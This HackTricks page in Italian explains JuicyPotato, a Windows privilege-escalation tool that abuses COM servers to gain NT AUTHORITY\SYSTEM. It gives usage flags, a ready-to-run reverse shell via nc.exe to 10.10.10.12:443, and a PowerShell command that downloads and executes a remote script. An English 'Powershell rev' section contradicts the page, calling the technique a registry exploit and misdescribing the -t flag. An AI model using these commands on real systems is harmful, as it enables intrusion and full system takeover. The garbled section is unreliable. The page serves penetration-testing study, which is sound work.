# JuicyPotato

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 in poi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) possono essere utilizzati per **sfruttare gli stessi privilegi e ottenere accesso al livello `NT AUTHORITY\SYSTEM`**. _**Controlla:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (sfruttando i privilegi d'oro) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versione zuccherata di_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un po' di succo, ovvero **un altro strumento di elevazione dei privilegi locali, da un account di servizio Windows a NT AUTHORITY\SYSTEM**_

#### Puoi scaricare juicypotato da [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Riassunto <a href="#summary" id="summary"></a>

**[Da juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e le sue [varianti](https://github.com/decoder-it/lonelypotato) sfruttano la catena di elevazione dei privilegi basata sul servizio [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) avendo il listener MiTM su `127.0.0.1:6666` e quando si hanno i privilegi `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisione della build di Windows abbiamo trovato una configurazione in cui `BITS` era intenzionalmente disabilitato e la porta `6666` era occupata.

Abbiamo deciso di rendere operativo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Diamo il benvenuto a Juicy Potato**.

> Per la teoria, vedi [Rotten Potato - Privilege Escalation da Service Accounts a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e segui la catena di link e riferimenti.

Abbiamo scoperto che, oltre a `BITS`, ci sono diversi server COM che possiamo sfruttare. Devono solo:

1. essere istanziabili dall'utente corrente, di solito un "utente di servizio" che ha privilegi di impersonificazione
2. implementare l'interfaccia `IMarshal`
3. essere eseguiti come utente con privilegi elevati (SYSTEM, Amministratore, ...)

Dopo alcuni test abbiamo ottenuto e testato un elenco esteso di [CLSID interessanti](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.

### Dettagli succosi <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato ti consente di:

* **Scegliere CLSID** _scegli qualsiasi CLSID tu voglia._ [_Qui_](http://ohpe.it/juicy-potato/CLSID/) _puoi trovare l'elenco organizzato per sistema operativo._
* **Porta di ascolto COM** _definisci la porta di ascolto COM che preferisci (anziché la porta 6666 codificata duramente)_
* **Indirizzo IP di ascolto COM** _associa il server a qualsiasi IP_
* **Modalità di creazione del processo** _a seconda dei privilegi dell'utente impersonato, puoi scegliere tra:_
* `CreateProcessWithToken` (necessita di `SeImpersonate`)
* `CreateProcessAsUser` (necessita di `SeAssignPrimaryToken`)
* `entrambi`
* **Processo da avviare** _avvia un eseguibile o uno script se l'exploit ha successo_
* **Argomento del processo** _personalizza gli argomenti del processo avviato_
* **Indirizzo del server RPC** _per un approccio stealthy puoi autenticarti a un server RPC esterno_
* **Porta del server RPC** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`..._
* **Modalità TEST** _principalmente per scopi di test, ad esempio testare le CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per il testing_](http://ohpe.it/juicy-potato/Test/)

### Utilizzo <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerazioni finali <a href="#final-thoughts" id="final-thoughts"></a>

**[Dalla descrizione di juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken`, allora si diventa **SYSTEM**.

È quasi impossibile prevenire l'abuso di tutti questi server COM. Si potrebbe pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG`, ma buona fortuna, sarà una sfida.

La soluzione effettiva è proteggere gli account sensibili e le applicazioni che vengono eseguite con gli account `* SERVICE`. Bloccare `DCOM` sicuramente impedirebbe questo exploit, ma potrebbe avere un impatto significativo sul sistema operativo sottostante.

Da: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Esempi

Nota: Visita [questa pagina](https://ohpe.it/juicy-potato/CLSID/) per una lista di CLSID da provare.

### Ottenere una shell inversa con nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

Powershell rev is a technique used to achieve local privilege escalation on Windows systems. It exploits the Windows registry to execute arbitrary code with elevated privileges. This technique is commonly used by hackers to gain full control over a compromised system.

To perform Powershell rev, you need to have a low-privileged user account on the target system. Here are the steps to follow:

1. Download the JuicyPotato tool from the official GitHub repository.
2. Open a Powershell terminal with your low-privileged user account.
3. Navigate to the directory where you downloaded the JuicyPotato tool.
4. Execute the following command to run the JuicyPotato tool:

```powershell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *
```

In this command, the `-l` flag specifies the local port to listen on, the `-p` flag specifies the program to execute with elevated privileges (in this case, `cmd.exe`), and the `-t` flag specifies the target process to impersonate.

5. If successful, the JuicyPotato tool will create a new process with elevated privileges, allowing you to execute commands with administrative rights.

It is important to note that Powershell rev is a powerful technique that can be used for both legitimate purposes (such as system administration) and malicious activities (such as hacking). Therefore, it is crucial to use this technique responsibly and only on systems that you have proper authorization to access.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Esegui un nuovo CMD (se hai accesso RDP)

![](<../../.gitbook/assets/image (37).png>)

## Problemi con CLSID

Spesso, la CLSID predefinita che JuicyPotato utilizza **non funziona** e l'exploit fallisce. Di solito, sono necessari più tentativi per trovare una **CLSID funzionante**. Per ottenere un elenco di CLSID da provare per un sistema operativo specifico, dovresti visitare questa pagina:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Verifica delle CLSID**

Innanzitutto, avrai bisogno di alcuni eseguibili diversi da juicypotato.exe.

Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricarlo nella tua sessione PS, e scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Questo script creerà un elenco di possibili CLSID da testare.

Quindi scarica [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(cambia il percorso dell'elenco delle CLSID e dell'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID, e **quando il numero di porta cambia, significa che la CLSID ha funzionato**.

**Verifica** le CLSID funzionanti **utilizzando il parametro -c**

## Riferimenti
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
